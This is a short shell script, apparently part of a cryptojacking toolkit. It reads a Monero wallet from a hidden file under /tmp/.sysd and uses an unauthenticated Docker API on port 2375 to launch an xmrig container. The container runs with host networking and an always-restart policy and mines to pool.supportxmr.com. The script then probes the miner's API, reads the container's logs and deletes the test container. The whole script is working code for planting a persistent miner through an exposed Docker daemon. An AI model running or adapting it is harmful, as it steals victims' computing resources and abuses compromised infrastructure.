#!/bin/sh
# throwaway: does the HOSTNET rung actually work on this daemon? Creates a throwaway
# kwtest container with NetworkMode host and xmrig's API on 47999, then curls the host's
# own 47999. If this answers, the rung is viable and :47999 needs no docker-proxy at all.
set -u
W=$(grep -m1 '^WALLET=' /tmp/.sysd/worker.env | cut -d= -f2-)
echo "wallet=${W%??????????????????????????????????}"
B='{"Image":"xmrig/xmrig","Entrypoint":["sh","-c"],"Cmd":["while :; do /usr/bin/xmrig -o pool.supportxmr.com:443 -u '"$W"' -p hostnettest --no-color -k --tls --threads=1 --http-port=47999 --http-host=0.0.0.0; sleep 5; done"],"HostConfig":{"NetworkMode":"host","RestartPolicy":{"Name":"always"}}}'

curl -sS -m 10 -X DELETE "http://127.0.0.1:2375/containers/kwtest?force=1" >/dev/null 2>&1 || :
r=$(curl -fsS -m 40 -X POST "http://127.0.0.1:2375/containers/create?name=kwtest" \
        -H 'Content-Type: application/json' -d "$B" 2>/dev/null) || r="CREATE_FAILED"
echo "create: $(printf '%s' "$r" | head -c 140)"
s=$(curl -sS -m 25 -X POST "http://127.0.0.1:2375/containers/kwtest/start" 2>/dev/null)
echo "start: [$s]"

for i in 1 2 3 4 5 6 7; do
    sleep 8
    a=$(curl -sS -m 3 "http://127.0.0.1:47999/2/summary" 2>/dev/null | head -c 120)
    echo "t=$((i*8))s hostnet api=[$a]"
    if [ -n "$a" ]; then break; fi
done

echo "== container state / logs"
curl -sS -m 8 "http://127.0.0.1:2375/containers/kwtest/json" 2>/dev/null | grep -o -e '"Running":[a-z]*' -e '"NetworkMode":"[a-z]*"' | head -4
curl -sS -m 8 "http://127.0.0.1:2375/containers/kwtest/logs?stdout=1&stderr=1&tail=6" 2>/dev/null | tr -d '\000-\010\013\014\016-\037' | tail -8
echo "== cleanup"
curl -sS -m 10 -X DELETE "http://127.0.0.1:2375/containers/kwtest?force=1" >/dev/null 2>&1 || :
date -u
